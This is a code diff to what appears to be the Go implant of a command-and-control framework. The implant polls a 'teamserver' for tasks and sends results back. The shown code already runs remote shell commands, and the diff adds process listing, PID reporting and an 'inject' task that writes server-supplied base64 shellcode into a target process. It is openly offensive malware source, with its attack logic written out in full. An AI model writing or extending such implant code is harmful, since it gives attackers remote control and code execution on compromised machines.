@@ -7,6 +7,7 @@ import (
 	"os/user"
 	"strings"
 	"time"
+	"strconv"
 )
 
 var (
@@ -128,7 +129,7 @@ func main() {
 			return
 		}
 
-		//fmt.Println(json_data)
+		// fmt.Println(json_data)
 		if json_data["message"] == "No tasks found" {
 			fmt.Println("[*] No tasks found, going back to sleep...")
 			continue
@@ -255,6 +256,7 @@ func main() {
 			}
 
 			fmt.Println("[*] Results sent successfully")
+
 		case "shell":
 			fmt.Println("[*] Found 'shell', executing command")
 			fmt.Println("[*] Shell Args: " + strings.Join(command_args, " "))
@@ -267,7 +269,7 @@ func main() {
 			}
 
 			result := b64_encode([]byte(shell_res))
-			
+
 			result_struct := TaskResult{
 				CommandID: command_id,
 				Result:    result,
@@ -292,7 +294,131 @@ func main() {
 			}
 
 			fmt.Println("[*] Results sent successfully")
-			
+
+		case "ps":
+			fmt.Println("[*] Found 'ps', executing command")
+			command_id := task["CommandID"].(string)
+			ps_res, err := ps()
+			if err != nil {
+				fmt.Println("[!] Error executing ps command")
+				fmt.Println(err)
+				return
+			}
+
+			result := b64_encode([]byte(ps_res))
+
+			result_struct := TaskResult{
+				CommandID: command_id,
+				Result:    result,
+			}
+
+			jsonResult, err := json.Marshal(result_struct)
+			if err != nil {
+				fmt.Println("[!] Error marshalling result")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Sending results to teamserver...")
+			fmt.Println(string(jsonResult))
+
+			_, err = post_results(agent, PostResult, jsonResult, command_id)
+
+			if err != nil {
+				fmt.Println("[!] Error posting results")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Results sent successfully")
+
+		case "getpid":
+			fmt.Println("[*] Found 'getpid', executing command")
+			command_id := task["CommandID"].(string)
+			pid_res := get_pid()
+
+			result := b64_encode([]byte(pid_res))
+
+			result_struct := TaskResult{
+				CommandID: command_id,
+				Result:    result,
+			}
+
+			jsonResult, err := json.Marshal(result_struct)
+			if err != nil {
+				fmt.Println("[!] Error marshalling result")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Sending results to teamserver...")
+			fmt.Println(string(jsonResult))
+
+			_, err = post_results(agent, PostResult, jsonResult, command_id)
+
+			if err != nil {
+				fmt.Println("[!] Error posting results")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Results sent successfully")
+		
+		case "inject":
+			fmt.Println("[*] Found 'inject', executing command")
+			fmt.Println("[*] Inject Args: " + strings.Join(command_args, " "))
+			command_id := task["CommandID"].(string)
+			PID := command_args[0]
+			PIDInt, err := strconv.Atoi(PID)
+			if err != nil {
+				fmt.Println("[!] Error converting PID to integer")
+				fmt.Println(err)
+				return
+			}
+
+			shellcode, err := b64_decode(command_args[1])
+			if err != nil {
+				fmt.Println("[!] Error converting PID to integer")
+				fmt.Println(err)
+				return
+			}
+
+			inject_res, err := inject(PIDInt, shellcode)
+			if err != nil {
+				fmt.Println("[!] Error injecting shellcode")
+				fmt.Println(err)
+				return
+			}
+
+			var result string
+			if inject_res == "OK" {
+				result = b64_encode([]byte("Shellcode injected successfully"))
+			} else {
+				result = b64_encode([]byte("Error injecting shellcode"))
+			}
+
+			result_struct := TaskResult{
+				CommandID: command_id,
+				Result:    result,
+			}
+
+			jsonResult, err := json.Marshal(result_struct)
+			if err != nil {
+				fmt.Println("[!] Error marshalling result")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Sending results to teamserver...")
+
+			_, err = post_results(agent, PostResult, jsonResult, command_id)
+			if err != nil {
+				fmt.Println("[!] Error posting results")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Results sent successfully")
 
 		default:
 			fmt.Println("[!] Command not found")
